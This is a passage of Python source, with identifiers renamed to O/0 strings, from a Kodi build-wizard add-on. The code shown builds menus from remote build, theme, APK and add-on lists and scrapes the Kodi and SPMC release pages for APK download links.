	(OOO00O0O00OO00OOO )#line:2197
	OOO00O0O00OO00OOO =wiz .workingURL (SPEEDFILE )#line:2198
	if not OOO00O0O00OO00OOO ==True :#line:2199
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2200
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2201
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2202
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2203
		addFile ('%s'%OOO00O0O00OO00OOO ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2204
	else :#line:2205
		O0OOO00OOOOOOO0OO ,OOOO0000O0000O0O0 ,OO0O0OO0OO0OOOOO0 ,O00O0OO00OOO0O0OO ,O00OOOOOO0O0O0OO0 ,OO0O0000OO000OO00 ,O0OOO0000OOOOO000 =wiz .buildCount ()#line:2206
		O0O0OO00000OOOO00 =False ;O000OO0OO0000O000 =[]#line:2207
		if THIRDPARTY =='true':#line:2208
			if not THIRD1NAME ==''and not THIRD1URL =='':O0O0OO00000OOOO00 =True ;O000OO0OO0000O000 .append ('1')#line:2209
			if not THIRD2NAME ==''and not THIRD2URL =='':O0O0OO00000OOOO00 =True ;O000OO0OO0000O000 .append ('2')#line:2210
			if not THIRD3NAME ==''and not THIRD3URL =='':O0O0OO00000OOOO00 =True ;O000OO0OO0000O000 .append ('3')#line:2211
		O00OO0O00OOOO0O00 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2212
		OOO0O0000O000OOO0 =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O00OO0O00OOOO0O00 )#line:2213
		if O0OOO00OOOOOOO0OO ==1 and O0O0OO00000OOOO00 ==False :#line:2214
			for O00OO000OOOO0OOOO ,OOO00O00OOOO0O0OO ,OO00O0O00OOO00000 ,O00OO0OOOO0O0000O ,O0O00O0O0OO0O00OO ,OOO0O000O00O0O000 ,O000OO000OOOO000O ,OO0OOO0OO0O0OO000 ,OOOO000O0O0O0O000 ,O0OOOO0OOOO0O0000 in OOO0O0000O000OOO0 :#line:2215
				if not SHOWADULT =='true'and OOOO000O0O0O0O000 .lower ()=='yes':continue #line:2216
				if not DEVELOPER =='true'and wiz .strTest (O00OO000OOOO0OOOO ):continue #line:2217
				viewBuild (OOO0O0000O000OOO0 [0 ][0 ])#line:2218
				return #line:2219
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2222
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2223
		if O0O0OO00000OOOO00 ==True :#line:2224
			for OOO0000OO0O0O00OO in O000OO0OO0000O000 :#line:2225
				O00OO000OOOO0OOOO =eval ('THIRD%sNAME'%OOO0000OO0O0O00OO )#line:2226
		if len (OOO0O0000O000OOO0 )>=1 :#line:2228
			if SEPERATE =='true':#line:2229
				for O00OO000OOOO0OOOO ,OOO00O00OOOO0O0OO ,OO00O0O00OOO00000 ,O00OO0OOOO0O0000O ,O0O00O0O0OO0O00OO ,OOO0O000O00O0O000 ,O000OO000OOOO000O ,OO0OOO0OO0O0OO000 ,OOOO000O0O0O0O000 ,O0OOOO0OOOO0O0000 in OOO0O0000O000OOO0 :#line:2230
					if not SHOWADULT =='true'and OOOO000O0O0O0O000 .lower ()=='yes':continue #line:2231
					if not DEVELOPER =='true'and wiz .strTest (O00OO000OOOO0OOOO ):continue #line:2232
					O000000OOO00000O0 =createMenu ('install','',O00OO000OOOO0OOOO )#line:2233
					addDir ('[%s] %s (v%s)'%(float (O0O00O0O0OO0O00OO ),O00OO000OOOO0OOOO ,OOO00O00OOOO0O0OO ),'viewbuild',O00OO000OOOO0OOOO ,description =O0OOOO0OOOO0O0000 ,fanart =OO0OOO0OO0O0OO000 ,icon =O000OO000OOOO000O ,menu =O000000OOO00000O0 ,themeit =THEME2 )#line:2234
			else :#line:2235
				if O00O0OO00OOO0O0OO >0 :#line:2236
					O00O00OO0O00OO0O0 ='+'if SHOW17 =='false'else '-'#line:2237
					if SHOW17 =='true':#line:2239
						for O00OO000OOOO0OOOO ,OOO00O00OOOO0O0OO ,OO00O0O00OOO00000 ,O00OO0OOOO0O0000O ,O0O00O0O0OO0O00OO ,OOO0O000O00O0O000 ,O000OO000OOOO000O ,OO0OOO0OO0O0OO000 ,OOOO000O0O0O0O000 ,O0OOOO0OOOO0O0000 in OOO0O0000O000OOO0 :#line:2241
							if not SHOWADULT =='true'and OOOO000O0O0O0O000 .lower ()=='yes':continue #line:2242
							if not DEVELOPER =='true'and wiz .strTest (O00OO000OOOO0OOOO ):continue #line:2243
							OO0OOO000O00O0OOO =int (float (O0O00O0O0OO0O00OO ))#line:2244
							if OO0OOO000O00O0OOO ==17 :#line:2245
								O000000OOO00000O0 =createMenu ('install','',O00OO000OOOO0OOOO )#line:2246
								addDir ('[%s] %s (v%s)'%(float (O0O00O0O0OO0O00OO ),O00OO000OOOO0OOOO ,OOO00O00OOOO0O0OO ),'viewbuild',O00OO000OOOO0OOOO ,description =O0OOOO0OOOO0O0000 ,fanart =OO0OOO0OO0O0OO000 ,icon =O000OO000OOOO000O ,menu =O000000OOO00000O0 ,themeit =THEME2 )#line:2247
				if O00OOOOOO0O0O0OO0 >0 :#line:2248
					O00O00OO0O00OO0O0 ='+'if SHOW18 =='false'else '-'#line:2249
					if SHOW18 =='true':#line:2251
						for O00OO000OOOO0OOOO ,OOO00O00OOOO0O0OO ,OO00O0O00OOO00000 ,O00OO0OOOO0O0000O ,O0O00O0O0OO0O00OO ,OOO0O000O00O0O000 ,O000OO000OOOO000O ,OO0OOO0OO0O0OO000 ,OOOO000O0O0O0O000 ,O0OOOO0OOOO0O0000 in OOO0O0000O000OOO0 :#line:2253
							if not SHOWADULT =='true'and OOOO000O0O0O0O000 .lower ()=='yes':continue #line:2254
							if not DEVELOPER =='true'and wiz .strTest (O00OO000OOOO0OOOO ):continue #line:2255
							OO0OOO000O00O0OOO =int (float (O0O00O0O0OO0O00OO ))#line:2256
							if OO0OOO000O00O0OOO ==18 :#line:2257
								O000000OOO00000O0 =createMenu ('install','',O00OO000OOOO0OOOO )#line:2258
								addDir ('[%s] %s (v%s)'%(float (O0O00O0O0OO0O00OO ),O00OO000OOOO0OOOO ,OOO00O00OOOO0O0OO ),'viewbuild',O00OO000OOOO0OOOO ,description =O0OOOO0OOOO0O0000 ,fanart =OO0OOO0OO0O0OO000 ,icon =O000OO000OOOO000O ,menu =O000000OOO00000O0 ,themeit =THEME2 )#line:2259
				if OO0O0OO0OO0OOOOO0 >0 :#line:2260
					O00O00OO0O00OO0O0 ='+'if SHOW16 =='false'else '-'#line:2261
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(O00O00OO0O00OO0O0 ,OO0O0OO0OO0OOOOO0 ),'togglesetting','show16',themeit =THEME3 )#line:2262
					if SHOW16 =='true':#line:2263
						for O00OO000OOOO0OOOO ,OOO00O00OOOO0O0OO ,OO00O0O00OOO00000 ,O00OO0OOOO0O0000O ,O0O00O0O0OO0O00OO ,OOO0O000O00O0O000 ,O000OO000OOOO000O ,OO0OOO0OO0O0OO000 ,OOOO000O0O0O0O000 ,O0OOOO0OOOO0O0000 in OOO0O0000O000OOO0 :#line:2264
							if not SHOWADULT =='true'and OOOO000O0O0O0O000 .lower ()=='yes':continue #line:2265
							if not DEVELOPER =='true'and wiz .strTest (O00OO000OOOO0OOOO ):continue #line:2266
							OO0OOO000O00O0OOO =int (float (O0O00O0O0OO0O00OO ))#line:2267
							if OO0OOO000O00O0OOO ==16 :#line:2268
								O000000OOO00000O0 =createMenu ('install','',O00OO000OOOO0OOOO )#line:2269
								addDir ('[%s] %s (v%s)'%(float (O0O00O0O0OO0O00OO ),O00OO000OOOO0OOOO ,OOO00O00OOOO0O0OO ),'viewbuild',O00OO000OOOO0OOOO ,description =O0OOOO0OOOO0O0000 ,fanart =OO0OOO0OO0O0OO000 ,icon =O000OO000OOOO000O ,menu =O000000OOO00000O0 ,themeit =THEME2 )#line:2270
				if OOOO0000O0000O0O0 >0 :#line:2271
					O00O00OO0O00OO0O0 ='+'if SHOW15 =='false'else '-'#line:2272
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(O00O00OO0O00OO0O0 ,OOOO0000O0000O0O0 ),'togglesetting','show15',themeit =THEME3 )#line:2273
					if SHOW15 =='true':#line:2274
						for O00OO000OOOO0OOOO ,OOO00O00OOOO0O0OO ,OO00O0O00OOO00000 ,O00OO0OOOO0O0000O ,O0O00O0O0OO0O00OO ,OOO0O000O00O0O000 ,O000OO000OOOO000O ,OO0OOO0OO0O0OO000 ,OOOO000O0O0O0O000 ,O0OOOO0OOOO0O0000 in OOO0O0000O000OOO0 :#line:2275
							if not SHOWADULT =='true'and OOOO000O0O0O0O000 .lower ()=='yes':continue #line:2276
							if not DEVELOPER =='true'and wiz .strTest (O00OO000OOOO0OOOO ):continue #line:2277
							OO0OOO000O00O0OOO =int (float (O0O00O0O0OO0O00OO ))#line:2278
							if OO0OOO000O00O0OOO <=15 :#line:2279
								O000000OOO00000O0 =createMenu ('install','',O00OO000OOOO0OOOO )#line:2280
								addDir ('[%s] %s (v%s)'%(float (O0O00O0O0OO0O00OO ),O00OO000OOOO0OOOO ,OOO00O00OOOO0O0OO ),'viewbuild',O00OO000OOOO0OOOO ,description =O0OOOO0OOOO0O0000 ,fanart =OO0OOO0OO0O0OO000 ,icon =O000OO000OOOO000O ,menu =O000000OOO00000O0 ,themeit =THEME2 )#line:2281
		elif O0OOO0000OOOOO000 >0 :#line:2282
			if OO0O0000OO000OO00 >0 :#line:2283
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2284
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2285
			else :#line:2286
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2287
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2288
	setView ('files','viewType')#line:2289
def viewBuild (OO00000OO00000O0O ):#line:2291
	OOO00O00OOOO0O000 =wiz .workingURL (SPEEDFILE )#line:2292
	if not OOO00O00OOOO0O000 ==True :#line:2293
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2294
		addFile ('%s'%OOO00O00OOOO0O000 ,'',themeit =THEME3 )#line:2295
		return #line:2296
	if wiz .checkBuild (OO00000OO00000O0O ,'version')==False :#line:2297
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2298
		addFile ('%s was not found in the builds list.'%OO00000OO00000O0O ,'',themeit =THEME3 )#line:2299
		return #line:2300
	OO0OOO00OOO0O000O =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2301
	O00OOO0000OO000O0 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OO00000OO00000O0O ).findall (OO0OOO00OOO0O000O )#line:2302
	for OOO00O0OO0OO00000 ,O0O0O00OO000OOOOO ,O0OOOO00O0OOOOO00 ,O0OOOOOO0O0OOOO00 ,OOOOOO000OO0OO00O ,O00OOO0O0O00OO0OO ,OO00OO00OO0000O0O ,O000OOOO0O0OO000O ,OO0O000OOO000OOO0 ,O0OOOOO0O0O0O0O00 in O00OOO0000OO000O0 :#line:2303
		O00OOO0O0O00OO0OO =O00OOO0O0O00OO0OO if wiz .workingURL (O00OOO0O0O00OO0OO )else ICON #line:2304
		OO00OO00OO0000O0O =OO00OO00OO0000O0O if wiz .workingURL (OO00OO00OO0000O0O )else FANART #line:2305
		O0OO0OOOO0OO0O000 ='%s (v%s)'%(OO00000OO00000O0O ,OOO00O0OO0OO00000 )#line:2306
		if BUILDNAME ==OO00000OO00000O0O and OOO00O0OO0OO00000 >BUILDVERSION :#line:2307
			O0OO0OOOO0OO0O000 ='%s [COLOR red][CURRENT v%s][/COLOR]'%(O0OO0OOOO0OO0O000 ,BUILDVERSION )#line:2308
		O0000O0OOO00OO0OO =int (float (KODIV ));O0OOO0O00O0OOO0OO =int (float (O0OOOOOO0O0OOOO00 ))#line:2317
		if not O0000O0OOO00OO0OO ==O0OOO0O00O0OOO0OO :#line:2318
			if O0000O0OOO00OO0OO ==16 and O0OOO0O00O0OOO0OO <=15 :O0O00OO000OOO00O0 =False #line:2319
			else :O0O00OO000OOO00O0 =True #line:2320
		else :O0O00OO000OOO00O0 =False #line:2321
		addFile ('התקנה','install',OO00000OO00000O0O ,'fresh',description =O0OOOOO0O0O0O0O00 ,fanart =OO00OO00OO0000O0O ,icon =O00OOO0O0O00OO0OO ,themeit =THEME1 )#line:2325
		if not OOOOOO000OO0OO00O =='http://':#line:2328
			if wiz .workingURL (OOOOOO000OO0OO00O )==True :#line:2329
				addFile (wiz .sep ('THEMES'),'',fanart =OO00OO00OO0000O0O ,icon =O00OOO0O0O00OO0OO ,themeit =THEME3 )#line:2330
				OO0OOO00OOO0O000O =wiz .openURL (OOOOOO000OO0OO00O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2331
				O00OOO0000OO000O0 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO0OOO00OOO0O000O )#line:2332
				for O0000O00O0000OOOO ,O0OO0O0O0O00OOO00 ,O000000O0OO0O0OOO ,O0OO00OOOOOOO0OO0 ,O00O00O0O0O0OO0O0 ,O0OOOOO0O0O0O0O00 in O00OOO0000OO000O0 :#line:2333
					if not SHOWADULT =='true'and O00O00O0O0O0OO0O0 .lower ()=='yes':continue #line:2334
					O000000O0OO0O0OOO =O000000O0OO0O0OOO if O000000O0OO0O0OOO =='http://'else O00OOO0O0O00OO0OO #line:2335
					O0OO00OOOOOOO0OO0 =O0OO00OOOOOOO0OO0 if O0OO00OOOOOOO0OO0 =='http://'else OO00OO00OO0000O0O #line:2336
					addFile (O0000O00O0000OOOO if not O0000O00O0000OOOO ==BUILDTHEME else "[B]%s (Installed)[/B]"%O0000O00O0000OOOO ,'theme',OO00000OO00000O0O ,O0000O00O0000OOOO ,description =O0OOOOO0O0O0O0O00 ,fanart =O0OO00OOOOOOO0OO0 ,icon =O000000O0OO0O0OOO ,themeit =THEME3 )#line:2337
	setView ('files','viewType')#line:2338
def viewThirdList (O0O0OO0O0O0OO00O0 ):#line:2340
	OO0O000OOO00OO0OO =eval ('THIRD%sNAME'%O0O0OO0O0O0OO00O0 )#line:2341
	OO0O0OO0OOO000OO0 =eval ('THIRD%sURL'%O0O0OO0O0O0OO00O0 )#line:2342
	O0OOOO00OOOO0O0O0 =wiz .workingURL (OO0O0OO0OOO000OO0 )#line:2343
	if not O0OOOO00OOOO0O0O0 ==True :#line:2344
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2345
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2346
	else :#line:2347
		OOOOOOOOOO00O0000 ,O00OO0000000000OO =wiz .thirdParty (OO0O0OO0OOO000OO0 )#line:2348
		addFile ("[B]%s[/B]"%OO0O000OOO00OO0OO ,'',themeit =THEME3 )#line:2349
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2350
		if OOOOOOOOOO00O0000 :#line:2351
			for OO0O000OOO00OO0OO ,OOO00OOOO00O000OO ,OO0O0OO0OOO000OO0 ,OOO000000OO0OO000 ,OO000OOOOOO0OOOO0 ,O0O0O0000O0OOOO00 ,OO0000OO0O00000OO ,O00O0OO000OOO0O00 in O00OO0000000000OO :#line:2352
				if not SHOWADULT =='true'and OO0000OO0O00000OO .lower ()=='yes':continue #line:2353
				addFile ("[%s] %s v%s"%(OOO000000OO0OO000 ,OO0O000OOO00OO0OO ,OOO00OOOO00O000OO ),'installthird',OO0O000OOO00OO0OO ,OO0O0OO0OOO000OO0 ,icon =OO000OOOOOO0OOOO0 ,fanart =O0O0O0000O0OOOO00 ,description =O00O0OO000OOO0O00 ,themeit =THEME2 )#line:2354
		else :#line:2355
			for OO0O000OOO00OO0OO ,OO0O0OO0OOO000OO0 ,OO000OOOOOO0OOOO0 ,O0O0O0000O0OOOO00 ,O00O0OO000OOO0O00 in O00OO0000000000OO :#line:2356
				addFile (OO0O000OOO00OO0OO ,'installthird',OO0O000OOO00OO0OO ,OO0O0OO0OOO000OO0 ,icon =OO000OOOOOO0OOOO0 ,fanart =O0O0O0000O0OOOO00 ,description =O00O0OO000OOO0O00 ,themeit =THEME2 )#line:2357
def editThirdParty (O0O0000O00O0OO0O0 ):#line:2359
	OOO0OO0OOOOO000OO =eval ('THIRD%sNAME'%O0O0000O00O0OO0O0 )#line:2360
	O0OOOO0OO0OO0OO00 =eval ('THIRD%sURL'%O0O0000O00O0OO0O0 )#line:2361
	OOO000OOO000OOO0O =wiz .getKeyboard (OOO0OO0OOOOO000OO ,'Enter the Name of the Wizard')#line:2362
	OOOO00O0O0OOO0OOO =wiz .getKeyboard (O0OOOO0OO0OO0OO00 ,'Enter the URL of the Wizard Text')#line:2363
	wiz .setS ('wizard%sname'%O0O0000O00O0OO0O0 ,OOO000OOO000OOO0O )#line:2365
	wiz .setS ('wizard%surl'%O0O0000O00O0OO0O0 ,OOOO00O0O0OOO0OOO )#line:2366
def apkScraper (name =""):#line:2368
	if name =='kodi':#line:2369
		O00O0OO00000OOOOO ='http://mirrors.kodi.tv/releases/android/arm/'#line:2370
		O0O0O0O0OO00O00OO ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2371
		OO00O00OOOO00000O =wiz .openURL (O00O0OO00000OOOOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2372
		OOO0O0O0OOOO00O0O =wiz .openURL (O0O0O0O0OO00O00OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2373
		OOO0OO00O0O0O0O0O =0 #line:2374
		O00O00OOOOO0O0O0O =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OO00O00OOOO00000O )#line:2375
		OO00OOO0OOO00O0O0 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OOO0O0O0OOOO00O0O )#line:2376
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2378
		OOO0OOO00OO0O0000 =False #line:2379
		for O00OOOO0O0O00OOOO ,name ,O0OOO0OOO0O00OOOO ,O00O000OOOOO0OO00 in O00O00OOOOO0O0O0O :#line:2380
			if O00OOOO0O0O00OOOO in ['../','old/']:continue #line:2381
			if not O00OOOO0O0O00OOOO .endswith ('.apk'):continue #line:2382
			if not O00OOOO0O0O00OOOO .find ('_')==-1 and OOO0OOO00OO0O0000 ==True :continue #line:2383
			try :#line:2384
				O0O000O000OOOOOOO =name .split ('-')#line:2385
				if not O00OOOO0O0O00OOOO .find ('_')==-1 :#line:2386
					OOO0OOO00OO0O0000 =True #line:2387
					O00O0OOO0O00OOO00 ,OO0O000O00OOOOOO0 =O0O000O000OOOOOOO [2 ].split ('_')#line:2388
				else :#line:2389
					O00O0OOO0O00OOO00 =O0O000O000OOOOOOO [2 ]#line:2390
					OO0O000O00OOOOOO0 =''#line:2391
				OO0O0OOOO00OOO000 ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O000O000OOOOOOO [0 ].title (),O0O000O000OOOOOOO [1 ],OO0O000O00OOOOOO0 .upper (),O00O0OOO0O00OOO00 ,COLOR2 ,O0OOO0OOO0O00OOOO .replace (' ',''),COLOR1 ,O00O000OOOOO0OO00 )#line:2392
				O0O0O0O0000O00OOO =urljoin (O00O0OO00000OOOOO ,O00OOOO0O0O00OOOO )#line:2393
				addFile (OO0O0OOOO00OOO000 ,'apkinstall',"%s v%s%s %s"%(O0O000O000OOOOOOO [0 ].title (),O0O000O000OOOOOOO [1 ],OO0O000O00OOOOOO0 .upper (),O00O0OOO0O00OOO00 ),O0O0O0O0000O00OOO )#line:2394
				OOO0OO00O0O0O0O0O +=1 #line:2395
			except :#line:2396
				wiz .log ("Error on: %s"%name )#line:2397
		for O00OOOO0O0O00OOOO ,name ,O0OOO0OOO0O00OOOO ,O00O000OOOOO0OO00 in OO00OOO0OOO00O0O0 :#line:2399
			if O00OOOO0O0O00OOOO in ['../','old/']:continue #line:2400
			if not O00OOOO0O0O00OOOO .endswith ('.apk'):continue #line:2401
			if not O00OOOO0O0O00OOOO .find ('_')==-1 :continue #line:2402
			try :#line:2403
				O0O000O000OOOOOOO =name .split ('-')#line:2404
				OO0O0OOOO00OOO000 ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O000O000OOOOOOO [0 ].title (),O0O000O000OOOOOOO [1 ],O0O000O000OOOOOOO [2 ],COLOR2 ,O0OOO0OOO0O00OOOO .replace (' ',''),COLOR1 ,O00O000OOOOO0OO00 )#line:2405
				O0O0O0O0000O00OOO =urljoin (O0O0O0O0OO00O00OO ,O00OOOO0O0O00OOOO )#line:2406
				addFile (OO0O0OOOO00OOO000 ,'apkinstall',"%s v%s %s"%(O0O000O000OOOOOOO [0 ].title (),O0O000O000OOOOOOO [1 ],O0O000O000OOOOOOO [2 ]),O0O0O0O0000O00OOO )#line:2407
				OOO0OO00O0O0O0O0O +=1 #line:2408
			except :#line:2409
				wiz .log ("Error on: %s"%name )#line:2410
		if OOO0OO00O0O0O0O0O ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2411
	elif name =='spmc':#line:2412
		O0000000O000O00O0 ='https://github.com/koying/SPMC/releases'#line:2413
		OO00O00OOOO00000O =wiz .openURL (O0000000O000O00O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2414
		OOO0OO00O0O0O0O0O =0 #line:2415
		O00O00OOOOO0O0O0O =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (OO00O00OOOO00000O )#line:2416
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2418
		for name ,O00OO00O0O0OO0OO0 in O00O00OOOOO0O0O0O :#line:2420
			OO000O00000OO00OO =''#line:2421
			OO00OOO0OOO00O0O0 =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (O00OO00O0O0OO0OO0 )#line:2422
			for O0O00O00000OO0O0O ,O0O0O0OO0O000O000 ,O0000000O00OOO0OO in OO00OOO0OOO00O0O0 :#line:2423
				if O0000000O00OOO0OO .find ('armeabi')==-1 :continue #line:2424
				if O0000000O00OOO0OO .find ('launcher')>-1 :continue #line:2425
				OO000O00000OO00OO =urljoin ('https://github.com',O0O00O00000OO0O0O )#line:2426
				break #line:2427
		if OOO0OO00O0O0O0O0O ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2429
def apkMenu (url =None ):#line:2431
	if url ==None :#line:2432
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2435
	if not APKFILE =='http://':#line:2436
		if url ==None :#line:2437
			O0000OOOOO00O0O00 =wiz .workingURL (APKFILE )#line:2438
			O000OOOOOOOOOOO0O =uservar .APKFILE #line:2439
		else :#line:2440
			O0000OOOOO00O0O00 =wiz .workingURL (url )#line:2441
			O000OOOOOOOOOOO0O =url #line:2442
		if O0000OOOOO00O0O00 ==True :#line:2443
			OO0O0O000000O0000 =wiz .openURL (O000OOOOOOOOOOO0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2444
			OOOO0O00OOOO00O0O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO0O0O000000O0000 )#line:2445
			if len (OOOO0O00OOOO00O0O )>0 :#line:2446
				OO00O000OOOO000OO =0 #line:2447
				for OO0OOO000000OO0OO ,OO0O0O0000000O00O ,url ,O0OOO00O000OO000O ,OOOO0OO0O0OO000O0 ,OOO000O00OO000O00 ,OOO0O0O00O00O00OO in OOOO0O00OOOO00O0O :#line:2448
					if not SHOWADULT =='true'and OOO000O00OO000O00 .lower ()=='yes':continue #line:2449
					if OO0O0O0000000O00O .lower ()=='yes':#line:2450
						OO00O000OOOO000OO +=1 #line:2451
						addDir ("[B]%s[/B]"%OO0OOO000000OO0OO ,'apk',url ,description =OOO0O0O00O00O00OO ,icon =O0OOO00O000OO000O ,fanart =OOOO0OO0O0OO000O0 ,themeit =THEME3 )#line:2452
					else :#line:2453
						OO00O000OOOO000OO +=1 #line:2454
						addFile (OO0OOO000000OO0OO ,'apkinstall',OO0OOO000000OO0OO ,url ,description =OOO0O0O00O00O00OO ,icon =O0OOO00O000OO000O ,fanart =OOOO0OO0O0OO000O0 ,themeit =THEME2 )#line:2455
					if OO00O000OOOO000OO <1 :#line:2456
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2457
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2458
		else :#line:2459
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2460
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2461
			addFile ('%s'%O0000OOOOO00O0O00 ,'',themeit =THEME3 )#line:2462
		return #line:2463
	else :wiz .log ("[APK Menu] No APK list added.")#line:2464
	setView ('files','viewType')#line:2465
def addonMenu (url =None ):#line:2467
	if not ADDONFILE =='http://':#line:2468
		if url ==None :#line:2469
			O000OO00O00OO0OO0 =wiz .workingURL (ADDONFILE )#line:2470
			O000O00O0OO0OOOO0 =uservar .ADDONFILE #line:2471
		else :#line:2472
			O000OO00O00OO0OO0 =wiz .workingURL (url )#line:2473
			O000O00O0OO0OOOO0 =url #line:2474
		if O000OO00O00OO0OO0 ==True :#line:2475
			OOOOO0OO00000OOO0 =wiz .openURL (O000O00O0OO0OOOO0 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2476
			O0OOO00O0OO00OOOO =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOOOO0OO00000OOO0 )#line:2477
			if len (O0OOO00O0OO00OOOO )>0 :#line:2478
				O0OO0O0OOOO0OOOO0 =0 #line:2479
				for O000O0O0O0O00O000 ,O0OO0OO0OOOO00OO0 ,url ,OOO0O00OOOO00O0OO ,O0OO000000OO0O0OO ,OOO00O0O00O0OOO00 ,OO000OOOOO000O00O ,OOO000000OO00OO0O ,OO000O00O0O0O00OO ,O0O0OO00000O0O0O0 in O0OOO00O0OO00OOOO :#line:2480
					if O0OO0OO0OOOO00OO0 .lower ()=='section':#line:2481
						O0OO0O0OOOO0OOOO0 +=1 #line:2482
						addDir ("[B]%s[/B]"%O000O0O0O0O00O000 ,'addons',url ,description =O0O0OO00000O0O0O0 ,icon =OO000OOOOO000O00O ,fanart =OOO000000OO00OO0O ,themeit =THEME3 )#line:2483
					else :#line:2484
						if not SHOWADULT =='true'and OO000O00O0O0O00OO .lower ()=='yes':continue #line:2485
						try :#line:2486
							O000O0O0OOOOO0O00 =xbmcaddon .Addon (id =O0OO0OO0OOOO00OO0 ).getAddonInfo ('path')#line:2487
							if os .path .exists (O000O0O0OOOOO0O00 ):#line:2488
								O000O0O0O0O00O000 ="[COLOR green][Installed][/COLOR] %s"%O000O0O0O0O00O000 #line:2489
						except :#line:2490
							pass #line:2491
						O0OO0O0OOOO0OOOO0 +=1 #line:2492
						addFile (O000O0O0O0O00O000 ,'addoninstall',O0OO0OO0OOOO00OO0 ,O000O00O0OO0OOOO0 ,description =O0O0OO00000O0O0O0 ,icon =OO000OOOOO000O00O ,fanart =OOO000000OO00OO0O ,themeit =THEME2 )#line:2493
					if O0OO0O0OOOO0OOOO0 <1 :#line:2494
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2495
			else :#line:2496
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2497
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2498
		else :#line:2499
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2500
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2501
			addFile ('%s'%O000OO00O00OO0OO0 ,'',themeit =THEME3 )#line:2502
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2503
	setView ('files','viewType')#line:2504
def addonInstaller (OOO0O0OOOOOO00000 ,O000O00O00O000OO0 ):#line:2506
	if not ADDONFILE =='http://':#line:2507
